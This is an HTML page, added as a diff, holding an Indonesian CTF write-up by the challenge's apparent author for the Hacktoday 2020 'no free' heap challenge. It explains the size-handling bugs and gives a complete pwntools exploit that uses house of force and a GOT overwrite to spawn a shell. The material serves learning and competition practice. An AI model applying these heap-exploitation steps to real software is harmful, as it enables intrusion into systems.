@@ -1,0 +1,417 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="Bintang Fikriguska ">
+<meta name="description" content="overview Diberikan file libc 2.23 dan binary dengan proteksi sebagai berikut.
+Pada saat memulai program, akan diminta username. Binary tersebut bisa menyimpan suatu note yang terdiri dari nama dan content, note tersebut bisa dilihat, diedit, tetapi tidak bisa dihapus. Username juga bisa diedit, dan yang terakhir kita bisa mengirim feedback. Nama, content, username, dan feedback akan disimpan dalam heap.
+Vulnerability Vulnerability terletak pada fungsi edit, berikut baris yang vuln:
+LOBYTE(nbytes) = *(_DWORD *)list[2 * v4]; hanya 1 byte nbytes pertama yang diassign pada baris diatas." />
+<meta name="keywords" content=", ctf, binary exploitation, hacktoday" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="#252627" />
+<link rel="canonical" href="https://fikriguska.github.io/posts/2020/08/hacktoday-2020-quals-no-free/" />
+
+
+    <title>
+        
+            Hacktoday 2020 (Quals) - no free :: Camelliose  — Hello Friend NG Theme
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.2.1/css/flag-icon.min.css" rel="stylesheet" type="text/css">
+
+
+
+<link rel="stylesheet" href="https://fikriguska.github.io/main.dede02da9537a98158079c023e83573e18127834838ef08172acce888341a797.css">
+
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://fikriguska.github.io/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://fikriguska.github.io/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://fikriguska.github.io/favicon-16x16.png">
+    <link rel="manifest" href="https://fikriguska.github.io/site.webmanifest">
+    <link rel="mask-icon" href="https://fikriguska.github.io/safari-pinned-tab.svg" color="#252627">
+    <link rel="shortcut icon" href="https://fikriguska.github.io/favicon.ico">
+    <meta name="msapplication-TileColor" content="#252627">
+    <meta name="theme-color" content="#252627">
+
+
+
+<meta itemprop="name" content="Hacktoday 2020 (Quals) - no free">
+<meta itemprop="description" content="overview Diberikan file libc 2.23 dan binary dengan proteksi sebagai berikut.
+Pada saat memulai program, akan diminta username. Binary tersebut bisa menyimpan suatu note yang terdiri dari nama dan content, note tersebut bisa dilihat, diedit, tetapi tidak bisa dihapus. Username juga bisa diedit, dan yang terakhir kita bisa mengirim feedback. Nama, content, username, dan feedback akan disimpan dalam heap.
+Vulnerability Vulnerability terletak pada fungsi edit, berikut baris yang vuln:
+LOBYTE(nbytes) = *(_DWORD *)list[2 * v4]; hanya 1 byte nbytes pertama yang diassign pada baris diatas.">
+<meta itemprop="datePublished" content="2020-08-11T22:16:58&#43;07:00" />
+<meta itemprop="dateModified" content="2020-08-11T22:16:58&#43;07:00" />
+<meta itemprop="wordCount" content="818">
+<meta itemprop="image" content="https://fikriguska.github.io"/>
+
+
+
+<meta itemprop="keywords" content="ctf,binary exploitation,hacktoday," />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://fikriguska.github.io"/>
+
+<meta name="twitter:title" content="Hacktoday 2020 (Quals) - no free"/>
+<meta name="twitter:description" content="overview Diberikan file libc 2.23 dan binary dengan proteksi sebagai berikut.
+Pada saat memulai program, akan diminta username. Binary tersebut bisa menyimpan suatu note yang terdiri dari nama dan content, note tersebut bisa dilihat, diedit, tetapi tidak bisa dihapus. Username juga bisa diedit, dan yang terakhir kita bisa mengirim feedback. Nama, content, username, dan feedback akan disimpan dalam heap.
+Vulnerability Vulnerability terletak pada fungsi edit, berikut baris yang vuln:
+LOBYTE(nbytes) = *(_DWORD *)list[2 * v4]; hanya 1 byte nbytes pertama yang diassign pada baris diatas."/>
+
+
+
+    <meta property="og:title" content="Hacktoday 2020 (Quals) - no free" />
+<meta property="og:description" content="overview Diberikan file libc 2.23 dan binary dengan proteksi sebagai berikut.
+Pada saat memulai program, akan diminta username. Binary tersebut bisa menyimpan suatu note yang terdiri dari nama dan content, note tersebut bisa dilihat, diedit, tetapi tidak bisa dihapus. Username juga bisa diedit, dan yang terakhir kita bisa mengirim feedback. Nama, content, username, dan feedback akan disimpan dalam heap.
+Vulnerability Vulnerability terletak pada fungsi edit, berikut baris yang vuln:
+LOBYTE(nbytes) = *(_DWORD *)list[2 * v4]; hanya 1 byte nbytes pertama yang diassign pada baris diatas." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://fikriguska.github.io/posts/2020/08/hacktoday-2020-quals-no-free/" />
+<meta property="og:image" content="https://fikriguska.github.io"/>
+<meta property="article:published_time" content="2020-08-11T22:16:58+07:00" />
+<meta property="article:modified_time" content="2020-08-11T22:16:58+07:00" />
+
+
+
+
+
+
+    <meta property="article:published_time" content="2020-08-11 22:16:58 &#43;0700 WIB" />
+
+
+
+
+
+
+
+
+    </head>
+
+    <body class="dark-theme">
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="https://fikriguska.github.io/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">~</span>
+            
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://fikriguska.github.io/about/">About</a></li><li><a href="https://fikriguska.github.io/posts/">Posts</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+            <span class="theme-toggle unselectable"></span>
+
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+<style>
+.post-content .img{
+	text-align: center;
+}
+</style>
+    <main class="post">
+
+        <div class="post-info">
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>4 minutes
+
+            
+
+            </p>
+        </div>
+
+        <article style="text-align: justify">
+            <h1 class="post-title">
+                <a href="https://fikriguska.github.io/posts/2020/08/hacktoday-2020-quals-no-free/">Hacktoday 2020 (Quals) - no free</a>
+            </h1>
+
+            
+
+            <div class="post-content">
+                <h2 id="overview">overview</h2>
+<p>Diberikan file libc 2.23 dan binary dengan proteksi sebagai berikut.</p>
+<p><img src="https://fikriguska.github.io/img/nofree-2.png" alt="image alt text"></p>
+<p>Pada saat memulai program, akan diminta username. Binary tersebut bisa menyimpan suatu note yang terdiri dari nama dan content, note tersebut bisa dilihat, diedit, tetapi tidak bisa dihapus. Username juga bisa diedit, dan yang terakhir kita bisa mengirim feedback. Nama, content, username, dan feedback akan disimpan dalam heap.</p>
+<h2 id="vulnerability">Vulnerability</h2>
+<p>Vulnerability terletak pada fungsi <code>edit</code>, berikut baris yang vuln:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">LOBYTE(nbytes) <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)list[<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> v4];
+</code></pre></div><p>hanya 1 byte <code>nbytes</code> pertama yang diassign pada baris diatas. Jadi jika kita bisa mewrite sisa 3 bytenya sebelum baris diatas, maka <code>nbytes</code> akan memiliki size yang besar karena <code>nbytes</code> memiliki 4 byte bukan 1 byte. Tetapi sebenarnya terdapat vulnerability lain yaitu pada fungsi <code>create</code>:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">if</span> ( nbytes <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">255</span> )
+{
+    puts(<span style="color:#e6db74">&#34;Size Error&#34;</span>);
+    exit(<span style="color:#ae81ff">1</span>);
+}
+</code></pre></div><p><code>nbytes</code> bertipe int lalu bisa diisi dengan negatif dan lolos pengecekan, dan ketika input nama pada fungsi <code>input_str</code>:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">ssize_t <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">input_str</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>buf, size_t nbytes)
+{
+  ssize_t v3; <span style="color:#75715e">// [esp+Ch] [ebp-Ch]
+</span><span style="color:#75715e"></span>
+  v3 <span style="color:#f92672">=</span> read(<span style="color:#ae81ff">0</span>, buf, nbytes);
+  <span style="color:#66d9ef">if</span> ( v3 <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> )
+  {
+    puts(<span style="color:#e6db74">&#34;something wrong:/&#34;</span>);
+    exit(<span style="color:#ae81ff">1</span>);
+  }
+  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">*</span>((_BYTE <span style="color:#f92672">*</span>)buf <span style="color:#f92672">+</span> v3 <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">10</span> )
+    <span style="color:#f92672">*</span>((_BYTE <span style="color:#f92672">*</span>)buf <span style="color:#f92672">+</span> v3 <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+  <span style="color:#66d9ef">return</span> v3;
+}
+</code></pre></div><p>ya, <code>nbytes</code> pada fungsi <code>input_str</code> bertipe size_t (mirip dengan unsigned int, tidak bisa negatif). Jadi jika name size dimasukkan dengan -1 maka akan bisa read string sebanyak 0xFFFFFFFF. Sebenarnya saya tidak menyadari vuln ini wkwkw karena pada saat pembuatan soal saya menggunakan int pada fungsi <code>input_str</code>. Namun pada salah satu write up yang diterima, ada yang memanfaatkan vuln ini untuk solve soal walaupun telat submit beberapa detik saja. So, untuk siapa pun yang menemukan vuln ini, nice!</p>
+<h2 id="exploit">Exploit</h2>
+<p>OK, jika menggunakan vuln <code>nbytes</code> yang diisi dengan satu byte saja, bagaimana cara untuk membuat nilainya menjadi besar? Kita bisa set 3 byte sisanya dengan memanfaatkan “nilai sampah” atau nilai yang sudah tidak digunakan lagi dari stack frame fungsi sebelumnya yaitu fungsi edit profile. Jika kita mengubah username, pada offset ke 29 akan mulai mengoverwrite tempat <code>nbytes</code> berada apabila fungsi edit dipanggil. Dengan write offset ke 30, itu sudah cukup untuk mengubah size input name agar bisa mengoverwrite top chunk  dengan nilai yang sangat besar seperti 0xFFFFFFFF. Ini dilakukan untuk bisa melakukan house of force pada heap (<a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.25/house_of_force.c)">https://github.com/shellphish/how2heap/blob/master/glibc_2.25/house_of_force.c)</a>.</p>
+<p>contoh nilai <code>nbytes</code> sebelum diassign satu byte pertama:</p>
+<p><img src="https://fikriguska.github.io/img/nofree-3.png" alt="image alt text"></p>
+<p>sedudah:</p>
+<p><img src="https://fikriguska.github.io/img/nofree-4.png" alt="image alt text"></p>
+<p>ketika menggunakan fungsi <code>input_str</code>, maka fungsi tersebut akan menggunakan keseluruhan byte yaitu bisa mengambil string sebanyak 0x6120 karakter, boom.</p>
+<p>Namun sebelum kita melakukan house of force, kita perlu mengetahui address dari target dan top chunk itu sendiri. Untuk leak heap address kita harus mengubah size input dengan cara yang tadi terlebih dahulu, yaitu write offset ke 30 pada edit username. Setelah itu edit note dengan name sebanyak 256 tanpa newline, ketika note diview, address heap akan terleak.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;username: &#39;</span>, <span style="color:#e6db74">&#39;camelliose&#39;</span>)
+    add(<span style="color:#ae81ff">0x20</span>, <span style="color:#e6db74">&#39;a&#39;</span>, <span style="color:#e6db74">&#39;a&#39;</span>)
+    edit_profile(<span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">30</span>)
+    edit(<span style="color:#ae81ff">0</span>, <span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">255</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;@&#39;</span>, <span style="color:#e6db74">&#39;a&#39;</span>)
+    view(<span style="color:#ae81ff">0</span>)
+    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;@&#39;</span>)
+    heap_base <span style="color:#f92672">=</span> u32(p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">4</span>)) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x18</span>
+    top_chunk <span style="color:#f92672">=</span> heap_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x180</span>
+</code></pre></div><p>Setelah itu kita write top chunk size dengan 0xFFFFFFFF</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">    edit(<span style="color:#ae81ff">0</span>, <span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">0x150</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0xFFFFFFFF</span>), <span style="color:#e6db74">&#39;a&#39;</span>)
+</code></pre></div><p>Kita perlu melakukan kalkulasi size untuk menentukan target agar malloc mengembalikan nilai di address yang kita inginkan. Disini digunakanlah fungsi <code>feedback</code>, karena bisa merequest nilai malloc secara bebas. Saya menggunakan target pada bss yaitu pada <code>list</code> (0x804b0a0).</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">    target <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x804b0a0</span>
+    evil <span style="color:#f92672">=</span> target<span style="color:#f92672">-</span>top_chunk<span style="color:#f92672">-</span><span style="color:#ae81ff">16</span>
+    feedback(evil, <span style="color:#e6db74">&#39;&#39;</span>)
+</code></pre></div><p>Lalu saya mengubah list pertama menjadi nilai sebelum got atoi dikurang 4. Dan ketika di view libc atoi address akan terleak.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">    add(<span style="color:#ae81ff">0x20</span>,  <span style="color:#e6db74">&#39;x&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">4</span>  <span style="color:#f92672">+</span> p32(elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;atoi&#39;</span>]<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>), <span style="color:#e6db74">&#39;a&#39;</span>)
+    view(<span style="color:#ae81ff">0</span>)
+    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;Name: &#39;</span>)
+    libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> u32(p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">4</span>)) <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;atoi&#39;</span>]
+</code></pre></div><p>Write got atoi dengan system, setelah itu pada pemilihan menu tinggal kirim <code>/bin/sh</code> lalu akan mendapatkan shell</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">    edit(<span style="color:#ae81ff">0</span>, p32(libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;system&#39;</span>]), <span style="color:#e6db74">&#39;a&#39;</span>)
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;#&gt; &#39;</span>, <span style="color:#e6db74">&#39;/bin/sh&#39;</span>)
+</code></pre></div><h2 id="full-exploit-code">Full Exploit Code</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<span style="color:#f92672">import</span> sys
+
+BINARY <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;./chall&#39;</span>
+
+con <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;nc chall.codepwnda.id 17012&#39;</span>
+
+<span style="color:#66d9ef">if</span>(con):
+    con <span style="color:#f92672">=</span> con<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39; &#39;</span>)
+    HOST <span style="color:#f92672">=</span> con[<span style="color:#ae81ff">1</span>]
+    PORT <span style="color:#f92672">=</span> con[<span style="color:#ae81ff">2</span>]
+
+elf <span style="color:#f92672">=</span> ELF(BINARY, checksec<span style="color:#f92672">=</span>False)
+argv <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv
+<span style="color:#75715e"># context.terminal = &#39;gnome-terminal -e&#39;.split()</span>
+context<span style="color:#f92672">.</span>terminal <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;tmux splitw -h -p 70&#39;</span><span style="color:#f92672">.</span>split()
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add</span>(size, name, content):
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;#&gt; &#39;</span>, <span style="color:#e6db74">&#39;1&#39;</span>)
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;Name size: &#39;</span>, str(size))
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;Name: &#39;</span>, name)
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;Content: &#39;</span>, content)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">view</span>(index):
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;#&gt; &#39;</span>, <span style="color:#e6db74">&#39;2&#39;</span>)
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;Index : &#39;</span>, str(index))
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">edit</span>(index, name, content):
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;#&gt; &#39;</span>, <span style="color:#e6db74">&#39;3&#39;</span>)
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;Index: &#39;</span>, str(index))
+    p<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">&#39;Name: &#39;</span>, name)
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;Content: &#39;</span>, content)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">edit_profile</span>(name):
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;#&gt; &#39;</span>, <span style="color:#e6db74">&#39;5&#39;</span>)
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;username: &#39;</span>, name)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">feedback</span>(size, msg):
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;#&gt; &#39;</span>, <span style="color:#e6db74">&#39;6&#39;</span>)
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;size: &#39;</span>, str(size))
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;Feedback: &#39;</span>, msg)
+
+libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./libc-2.23.so&#39;</span>, checksec<span style="color:#f92672">=</span>False)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exploit</span>():
+
+    target <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x804b0a0</span>
+    
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;username: &#39;</span>, <span style="color:#e6db74">&#39;camelliose&#39;</span>)
+    add(<span style="color:#ae81ff">0x20</span>, <span style="color:#e6db74">&#39;a&#39;</span>, <span style="color:#e6db74">&#39;a&#39;</span>)
+    edit_profile(<span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">30</span>)
+    edit(<span style="color:#ae81ff">0</span>, <span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">255</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;@&#39;</span>, <span style="color:#e6db74">&#39;a&#39;</span>)
+    view(<span style="color:#ae81ff">0</span>)
+    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;@&#39;</span>)
+    heap_base <span style="color:#f92672">=</span> u32(p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">4</span>)) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x18</span>
+    top_chunk <span style="color:#f92672">=</span> heap_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x180</span>
+    
+    log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;target @ {}&#39;</span><span style="color:#f92672">.</span>format(hex(target)))
+    log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;heap_base @ {}&#39;</span><span style="color:#f92672">.</span>format(hex(heap_base)))
+    log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;top_chunk @ {}&#39;</span><span style="color:#f92672">.</span>format(hex(top_chunk)))
+
+    edit(<span style="color:#ae81ff">0</span>, <span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">0x150</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0xFFFFFFFF</span>), <span style="color:#e6db74">&#39;a&#39;</span>)
+
+
+    evil <span style="color:#f92672">=</span> target<span style="color:#f92672">-</span>top_chunk<span style="color:#f92672">-</span><span style="color:#ae81ff">16</span>
+
+    log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;evil size : {}&#39;</span><span style="color:#f92672">.</span>format(evil))
+    feedback(evil, <span style="color:#e6db74">&#39;&#39;</span>)
+
+    add(<span style="color:#ae81ff">0x20</span>,  <span style="color:#e6db74">&#39;x&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">4</span>  <span style="color:#f92672">+</span> p32(elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;atoi&#39;</span>]<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>), <span style="color:#e6db74">&#39;a&#39;</span>)
+    view(<span style="color:#ae81ff">0</span>)
+    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;Name: &#39;</span>)
+    libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> u32(p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">4</span>)) <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;atoi&#39;</span>]
+
+    log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;libc base @ {}&#39;</span><span style="color:#f92672">.</span>format(hex(libc<span style="color:#f92672">.</span>address)))
+
+    edit(<span style="color:#ae81ff">0</span>, p32(libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;system&#39;</span>]), <span style="color:#e6db74">&#39;a&#39;</span>)
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;#&gt; &#39;</span>, <span style="color:#e6db74">&#39;/bin/sh&#39;</span>)
+
+    p<span style="color:#f92672">.</span>interactive()
+
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+
+    p <span style="color:#f92672">=</span> process(BINARY)
+
+    <span style="color:#66d9ef">if</span> len(argv) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span>:
+        <span style="color:#66d9ef">if</span> argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;d&#39;</span>:
+            p <span style="color:#f92672">=</span> remote(HOST, PORT)
+        <span style="color:#66d9ef">else</span>:
+            cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;
+</span><span style="color:#e6db74">            b*edit
+</span><span style="color:#e6db74">            &#39;&#39;&#39;</span>
+            gdb<span style="color:#f92672">.</span>attach(p, cmd)
+    exploit()
+</code></pre></div><p><img src="https://fikriguska.github.io/img/nofree-5.png" alt="image alt text"></p>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+                <p>
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg><span class="tag"><a href="https://fikriguska.github.io/tags/ctf">ctf</a></span><span class="tag"><a href="https://fikriguska.github.io/tags/binary-exploitation">binary exploitation</a></span><span class="tag"><a href="https://fikriguska.github.io/tags/hacktoday">hacktoday</a></span>
+                </p>
+
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>818 Words</p>
+
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>2020-08-11 22:16 &#43;0700</p>
+        </div>
+
+        
+            <div class="pagination">
+                <div class="pagination__title">
+                    <span class="pagination__title-h"></span>
+                    <hr />
+                </div>
+
+                <div class="pagination__buttons">
+                    
+                        <span class="button previous">
+                            <a href="https://fikriguska.github.io/posts/2020/08/hacktoday-2020-quals-buffer-overflow/">
+                                <span class="button__icon">←</span>
+                                <span class="button__text">Hacktoday 2020 (Quals) - buffer overflow</span>
+                            </a>
+                        </span>
+                    
+
+                    
+                        <span class="button next">
+                            <a href="https://fikriguska.github.io/posts/2020/08/hacktoday-2020-quals-sum/">
+                                <span class="button__text">Hacktoday 2020 (Quals) - sum</span>
+                                <span class="button__icon">→</span>
+                            </a>
+                        </span>
+                    
+                </div>
+            </div>
+        
+            <div id="comments" class="thin">
+                <div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "fikriguska" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+            </div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>2020</span>
+	    <span>Indonesia</span>
+            
+                <span><a href="https://fikriguska.github.io">Bintang Fikriguska</a></span>
+            
+            
+            <span> <a href="https://fikriguska.github.io/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+        </div>
+    </div>
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Powered by <a href="http://gohugo.io">Hugo</a></span>
+            
+        </div>
+    </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+
+<script type="text/javascript" src="https://fikriguska.github.io/bundle.min.71be052e49740d65a77749a66c7e41b2f934c67fe08f37bf036d77cf7c34c90c83122f356c5fe8502d77a613eae1e3d900920dea1b5503167036da04f2798f19.js" integrity="sha512-cb4FLkl0DWWnd0mmbH5Bsvk0xn/gjze/A213z3w0yQyDEi81bF/oUC13phPq4ePZAJIN6htVAxZwNtoE8nmPGQ=="></script>
+
+
+
+    </body>
+</html>
